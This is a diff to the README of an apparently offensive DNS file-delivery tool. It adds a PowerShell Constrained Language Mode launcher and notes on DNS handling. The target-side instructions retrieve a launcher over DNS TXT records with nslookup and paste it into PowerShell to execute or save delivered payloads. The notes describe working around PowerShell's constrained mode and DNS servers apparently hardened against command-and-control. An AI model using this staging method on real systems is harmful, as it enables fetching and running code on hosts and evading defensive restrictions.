@@ -127,11 +127,12 @@ As the charset allowed for domain names is much more restrictive than for UNIX f
 ## Target
 On the target, start by **retrieving the launcher** of the desired file by requesting its dedicated `TXT` record. The following three launchers are supported:
 
-| Action  | Launcher                    | Description                                           |
-| ------- | --------------------------- | ----------------------------------------------------- |
-| Print   | `[filename].print.[domain]` | (**Default**) Print the delivered file to the console |
-| Execute | `[filename].exec.[domain]`  | Execute the delivered file (useful for scripts)       |
-| Save    | `[filename].save.[domain]`  | Save the delivered file to disk (useful for binaries) |
+| Action  | Launcher                    | Description                                                    |
+| ------- | --------------------------- | -------------------------------------------------------------- |
+| Print   | `[filename].print.[domain]` | (**Default**) Print the delivered file to the console          |
+| Execute | `[filename].exec.[domain]`  | Execute the delivered file (useful for scripts)                |
+| Save    | `[filename].save.[domain]`  | Save the delivered file to disk (useful for binaries)          |
+| Clm     | `[filename].clm.[domain]`   | Save the delivered file to disk (supporting CLM in powershell) |
 
 ```cmd
 nslookup -type=txt [filename].[stager].[domain]
@@ -142,3 +143,10 @@ Then, simply **copy and paste the launcher quoted in the DNS response to a Power
 **Example**:
 
 ![demo-target.git](img/demo-target.gif)
+
+# Improvements
+
+- Added resolution to type A and AAAA dns queries because some dns servers require that to forward the request. I found that when using `nslookup file-txt.save.domain.com 8.8.8.8` dnslivery received a type A query for save.domain.com and if that was unanswered the dns server 8.8.8.8 returned timeout. Resolving everything to localhost worked perfectly.
+- Added case insensitive domain resolution. In one scenario a client had a dns server that randomized upercase and lowercase letters, probably to avoid dns c&cs. I just added a quick patch to make the code case insensitive.
+- Added CLM mode. If Powershell's language mode is set to constrained it is not possible to execute the default save payload because method invocation is supported only on core types in the constrained language mode.
+- Added 53 UDP socket listener to show the port as open.
